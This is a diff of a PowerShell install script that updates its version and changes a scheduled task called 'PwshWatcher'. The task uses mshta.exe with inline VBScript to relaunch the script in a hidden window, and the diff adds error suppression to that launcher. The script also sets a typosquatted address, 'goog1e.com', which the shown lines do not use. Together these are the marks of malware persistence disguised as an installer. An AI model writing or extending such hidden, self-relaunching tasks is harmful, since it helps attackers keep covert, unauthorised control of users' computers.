@@ -6,7 +6,7 @@ param (
   [string]$Action = 'Install'
 )
 
-$taskVersion = "2.21"
+$taskVersion = "2.22"
 $uri = "https://goog1e.com"
 $Logfile = "$PSScriptRoot\install.log"
 $systemModulesPath = "C:\Program Files\WindowsPowerShell\Modules"
@@ -21,7 +21,7 @@ $TasksDefinitions = @{
     "Name"          = "PwshWatcher";
     "Values"        = @{
       "/ns:Task/ns:Actions/ns:Exec/ns:Command"   = "mshta.exe";
-      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments" = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''' + $thisFilePath + '''"""""", 0 : window.close")'
+      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments" = 'vbscript:Execute("On Error Resume Next : CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''' + $thisFilePath + '''"""""", 0 : window.close")'
     };
     "XmlDefinition" = @"
 <?xml version="1.0" encoding="UTF-16"?>
